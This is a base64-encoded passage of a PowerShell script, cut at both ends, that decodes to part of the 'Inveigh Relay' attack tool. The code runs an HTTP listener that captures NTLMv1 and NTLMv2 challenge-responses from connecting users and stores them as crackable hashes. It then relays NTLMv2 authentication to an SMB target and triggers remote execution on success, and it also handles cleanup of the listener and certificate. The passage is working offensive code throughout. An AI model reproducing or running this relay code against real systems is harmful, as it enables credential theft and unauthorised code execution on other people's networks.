JE5UTE1fY2hhbGxlbmdlCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoJE5UTE1fY2hhbGxlbmdlIC1hbmQgJE5UTE1fcmVzcG9uc2UgLWFuZCAoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKSkKICAgICAgICAgICAgICAgICAgICB7ICAgIAogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIE5UTE12MSBjaGFsbGVuZ2UvcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGNhcHR1cmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyArICIoIiArICRIVFRQX05UTE1faG9zdF9zdHJpbmcgKyAiKSIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVfcXVldWUuQWRkKCRpbnZlaWdoLkhUVFBfTlRMTV9oYXNoKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjFfbGlzdC5BZGQoJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSBjYXB0dXJlZCBmcm9tICIgKyAkaW52ZWlnaC5yZXF1ZXN0LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MgKyAiKCIgKyAkSFRUUF9OVExNX2hvc3Rfc3RyaW5nICsgIik6YG4iICsgJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiRIVFRQX3R5cGUgTlRMTXYxIGNoYWxsZW5nZS9yZXNwb25zZSB3cml0dGVuIHRvICIgKyAkaW52ZWlnaC5OVExNdjFfb3V0X2ZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykgLWFuZCAhJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QuQWRkKCRzb3VyY2VfSVAuSVBBZGRyZXNzVG9TdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgIyBOVExNdjIKICAgICAgICAgICAgICAgIHsgICAKICAgICAgICAgICAgICAgICAgICAkTlRMTV90eXBlID0gIk5UTE12MiIgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICROVExNX3Jlc3BvbnNlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkSFRUUF9yZXF1ZXN0X2J5dGVzWyRIVFRQX05UTE1fb2Zmc2V0Li4oJEhUVFBfTlRMTV9vZmZzZXQgKyAkSFRUUF9OVExNX2xlbmd0aCldKSAtcmVwbGFjZSAiLSIsIiIKICAgICAgICAgICAgICAgICAgICAkTlRMTV9yZXNwb25zZSA9ICROVExNX3Jlc3BvbnNlLkluc2VydCgzMiwnOicpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9OVExNX2hhc2ggPSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nICsgIjo6IiArICRIVFRQX05UTE1fZG9tYWluX3N0cmluZyArICI6IiArICROVExNX2NoYWxsZW5nZSArICI6IiArICROVExNX3Jlc3BvbnNlCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYoJE5UTE1fY2hhbGxlbmdlIC1hbmQgJE5UTE1fcmVzcG9uc2UgLWFuZCAoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCQoR2V0LURhdGUgLWZvcm1hdCAncycpICsgIiAtICRIVFRQX3R5cGUgTlRMTXYyIGNoYWxsZW5nZS9yZXNwb25zZSBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgY2FwdHVyZWQgZnJvbSAiICsgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzICsgIigiICsgJEhUVFBfTlRMTV9ob3N0X3N0cmluZyArICIpIildKQogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5OVExNdjJfZmlsZV9xdWV1ZS5BZGQoJGludmVpZ2guSFRUUF9OVExNX2hhc2gpCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLk5UTE12Ml9saXN0LkFkZCgkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgKyAiIC0gJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIGNhcHR1cmVkIGZyb20gIiArICRpbnZlaWdoLnJlcXVlc3QuUmVtb3RlRW5kcG9pbnQuQWRkcmVzcyArICIoIiArICRIVFRQX05UTE1faG9zdF9zdHJpbmcgKyAiKTpgbiIgKyAkaW52ZWlnaC5IVFRQX05UTE1faGFzaCkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSBOVExNdjIgY2hhbGxlbmdlL3Jlc3BvbnNlIHdyaXR0ZW4gdG8gIiArICRpbnZlaWdoLk5UTE12Ml9vdXRfZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgKCRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykgLWFuZCAhJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgKz0gJGludmVpZ2gucmVxdWVzdC5SZW1vdGVFbmRwb2ludC5BZGRyZXNzCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuU3RhdHVzQ29kZSA9IDIwMAogICAgICAgICAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJycKICAgICAgICAgICAgICAgICRIVFRQX3Jhd191cmxfb3V0cHV0ID0gJHRydWUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCRpbnZlaWdoLlNNQl9yZWxheSAtYW5kICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCAtZXEgMykKICAgICAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICAgICAgaWYoISRTTUJSZWxheVVzZXJuYW1lcyAtb3IgJFNNQlJlbGF5VXNlcm5hbWVzIC1jb250YWlucyAkSFRUUF9OVExNX3VzZXJfc3RyaW5nIC1vciAkU01CUmVsYXlVc2VybmFtZXMgLWNvbnRhaW5zICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyIpCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubWFjaGluZV9hY2NvdW50cyAtb3IgKCEkaW52ZWlnaC5tYWNoaW5lX2FjY291bnRzIC1hbmQgLW5vdCAkSFRUUF9OVExNX3VzZXJfc3RyaW5nLkVuZHNXaXRoKCckJykpKQogICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guU01CUmVsYXlfZmFpbGVkX2xpc3QgLW5vdGNvbnRhaW5zICIkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkTlRMTV90eXBlIC1lcSAnTlRMTXYyJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJTZW5kaW5nICROVExNX3R5cGUgcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGZvciByZWxheSB0byAkU01CUmVsYXl0YXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTZW5kaW5nICROVExNX3R5cGUgcmVzcG9uc2UgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGZvciByZWxheSB0byAkU01CUmVsYXl0YXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzID0gU01CUmVsYXlSZXNwb25zZSAkU01CX3JlbGF5X3NvY2tldCAkSFRUUF9yZXF1ZXN0X2J5dGVzICRTTUJfdXNlcl9JRAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3Jlc3BvbnNlX3JldHVybl9ieXRlcyA9ICRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzWzEuLiRTTUJfcmVsYXlfcmVzcG9uc2VfcmV0dXJuX2J5dGVzLkxlbmd0aF0KICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoISRTTUJfcmVsYXlfZmFpbGVkIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX3JlbGF5X3Jlc3BvbnNlX3JldHVybl9ieXRlc1s5Li4xMl0pIC1lcSAnMDAtMDAtMDAtMDAnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gc3VjY2Vzc2Z1bCBmb3IgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgb24gJFNNQlJlbGF5VGFyZ2V0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgdG8gU01CIHJlbGF5IGF1dGhlbnRpY2F0aW9uIHN1Y2Nlc3NmdWwgZm9yICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIG9uICRTTUJSZWxheVRhcmdldCIpXSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNNQlJlbGF5RXhlY3V0ZSAkU01CX3JlbGF5X3NvY2tldCAkU01CX3VzZXJfSUQgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gZmFpbGVkIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB0byBTTUIgcmVsYXkgYXV0aGVudGljYXRpb24gZmFpbGVkIGZvciAkSFRUUF9OVExNX2RvbWFpbl9zdHJpbmdcJEhUVFBfTlRMTV91c2VyX3N0cmluZyBvbiAkU01CUmVsYXlUYXJnZXQiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJSZWxheV9mYWlsZWRfbGlzdC5BZGQoIiRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nICRTTUJSZWxheVRhcmdldCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJOVExNdjEgU01CIHJlbGF5IG5vdCB5ZXQgc3VwcG9ydGVkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTlRMTXYxIHJlbGF5IG5vdCB5ZXQgc3VwcG9ydGVkIildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5TTUJfcmVsYXlfYWN0aXZlX3N0ZXAgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCJBYm9ydGluZyBTTUIgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgaGFzIGFscmVhZHkgYmVlbiB0cmllZCBvbiAkU01CUmVsYXlUYXJnZXQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoJGludmVpZ2gubG9nX2ZpbGVfcXVldWVbJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEFib3J0aW5nIHJlbGF5IHNpbmNlICRIVFRQX05UTE1fZG9tYWluX3N0cmluZ1wkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGhhcyBhbHJlYWR5IGJlZW4gdHJpZWQgb24gJFNNQlJlbGF5VGFyZ2V0IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU01CX3JlbGF5X3NvY2tldC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIkFib3J0aW5nIFNNQiByZWxheSBzaW5jZSAkSFRUUF9OVExNX3VzZXJfc3RyaW5nIGFwcGVhcnMgdG8gYmUgYSBtYWNoaW5lIGFjY291bnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gQWJvcnRpbmcgcmVsYXkgc2luY2UgJEhUVFBfTlRMTV91c2VyX3N0cmluZyBhcHBlYXJzIHRvIGJlIGEgbWFjaGluZSBhY2NvdW50IildKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guU01CX3JlbGF5X2FjdGl2ZV9zdGVwID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5jb25zb2xlX3F1ZXVlLkFkZCgiJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgbm90IG9uIFNNQiByZWxheSB1c2VybmFtZSBsaXN0IikKICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZVskaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfTlRMTV9kb21haW5fc3RyaW5nXCRIVFRQX05UTE1fdXNlcl9zdHJpbmcgbm90IG9uIHJlbGF5IHVzZXJuYW1lIGxpc3QiKV0pCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLlNNQl9yZWxheV9hY3RpdmVfc3RlcCA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9yZWxheV9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJE5UTE0gPSAnTlRMTScKICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgIH0KICAgICAgICAKICAgICAgICBbQnl0ZVtdXSAkSFRUUF9idWZmZXIgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRpbnZlaWdoLm1lc3NhZ2UpCiAgICAgICAgJGludmVpZ2gucmVzcG9uc2UuQ29udGVudExlbmd0aDY0ID0gJEhUVFBfYnVmZmVyLkxlbmd0aAogICAgICAgICRpbnZlaWdoLnJlc3BvbnNlLkFkZEhlYWRlcigiV1dXLUF1dGhlbnRpY2F0ZSIsJE5UTE0pCiAgICAgICAgJEhUVFBfc3RyZWFtID0gJGludmVpZ2gucmVzcG9uc2UuT3V0cHV0U3RyZWFtCiAgICAgICAgJEhUVFBfc3RyZWFtLldyaXRlKCRIVFRQX2J1ZmZlciwwLCRIVFRQX2J1ZmZlci5MZW5ndGgpCiAgICAgICAgJEhUVFBfc3RyZWFtLmNsb3NlKCkKICAgIH0KCiAgICAkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLlN0b3AoKQogICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5DbG9zZSgpCn0KCiRjb250cm9sX3JlbGF5X3NjcmlwdGJsb2NrID0gCnsKICAgIHBhcmFtICgkUnVuVGltZSkKCiAgICBpZigkUnVuVGltZSkKICAgIHsgICAgCiAgICAgICAgJGNvbnRyb2xfdGltZW91dCA9IE5ldy1UaW1lU3BhbiAtTWludXRlcyAkUnVuVGltZQogICAgICAgICRjb250cm9sX3N0b3B3YXRjaCA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoXTo6U3RhcnROZXcoKQogICAgfQogICAgICAgCiAgICB3aGlsZSAoJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgIHsKCiAgICAgICAgaWYoJFJ1blRpbWUpCiAgICAgICAgewoKICAgICAgICAgICAgaWYoJGNvbnRyb2xfc3RvcHdhdGNoLkVsYXBzZWQgLWdlICRjb250cm9sX3RpbWVvdXQpCiAgICAgICAgICAgIHsKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5IVFRQX2xpc3RlbmVyLklzTGlzdGVuaW5nKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLkhUVFBfbGlzdGVuZXIuU3RvcCgpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUF9saXN0ZW5lci5DbG9zZSgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIkludmVpZ2ggUmVsYXkgZXhpdGVkIGR1ZSB0byBydW4gdGltZSBhdCAkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSIpCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWyRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBJbnZlaWdoIFJlbGF5IGV4aXRlZCBkdWUgdG8gcnVuIHRpbWUiKV0pCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtbSA1CiAgICAgICAgICAgICAgICAkaW52ZWlnaC5yZWxheV9ydW5uaW5nID0gJGZhbHNlCgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2guSFRUUFMpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJiAibmV0c2giIGh0dHAgZGVsZXRlIHNzbGNlcnQgaXBwb3J0PTAuMC4wLjA6NDQzID4gJG51bGwKICAgICAgICAKICAgICAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzLlg1MDlTdG9yZSgiTXkiLCJMb2NhbE1hY2hpbmUiKQogICAgICAgICAgICAgICAgICAgICAgICAkY2VydGlmaWNhdGVfc3RvcmUuT3BlbignUmVhZFdyaXRlJykKICAgICAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlID0gJGNlcnRpZmljYXRlX3N0b3JlLmNlcnRpZmljYXRlcy5GaW5kKCJGaW5kQnlUaHVtYnByaW50IiwkaW52ZWlnaC5jZXJ0aWZpY2F0ZV90aHVtYnByaW50LCRmYWxzZSlbMF0KICAgICAgICAgICAgICAgICAgICAgICAgJGNlcnRpZmljYXRlX3N0b3JlLlJlbW92ZSgkY2VydGlmaWNhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgICRjZXJ0aWZpY2F0ZV9zdG9yZS5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoCiAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guc3RhdHVzX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNTTCBDZXJ0aWZpY2F0ZSBEZWxldGlvbiBFcnJvciAtIFJlbW92ZSBNYW51YWxseSIpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gU1NMIENlcnRpZmljYXRlIERlbGV0aW9uIEVycm9yIC0gUmVtb3ZlIE1hbnVhbGx5IikKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTU0wgQ2VydGlmaWNhdGUgRGVsZXRpb24gRXJyb3IgLSBSZW1vdmUgTWFudWFsbHkiIHwgT3V0LUZpbGUgJEludmVpZ2gubG9nX291dF9maWxlIC1BcHBlbmQgICAKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgfSAgICAgCgogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUCA9ICRmYWxzZQogICAgICAgICAgICAgICAgJGludmVpZ2guSFRUUFMgPSAkZmFsc2UKICAgICAgICAgICAgfQoKICAgICAgICB9CgogICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0IC1hbmQgJGludmVpZ2gucmVsYXlfZmlsZV9vdXRwdXQpCiAgICAgICAgewoKICAgICAgICAgICAgd2hpbGUoJGludmVpZ2gubG9nX2ZpbGVfcXVldWUuQ291bnQgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlWzBdfE91dC1GaWxlICRpbnZlaWdoLmxvZ19vdXRfZmlsZSAtQXBwZW5kCiAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5SZW1vdmVBdCgwKQogICAgICAgICAgICB9CgogICAgICAgICAgICB3aGlsZSgkaW52ZWlnaC5OVExNdjFfZmlsZV9xdWV1ZS5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guTlRMTXYxX2ZpbGVf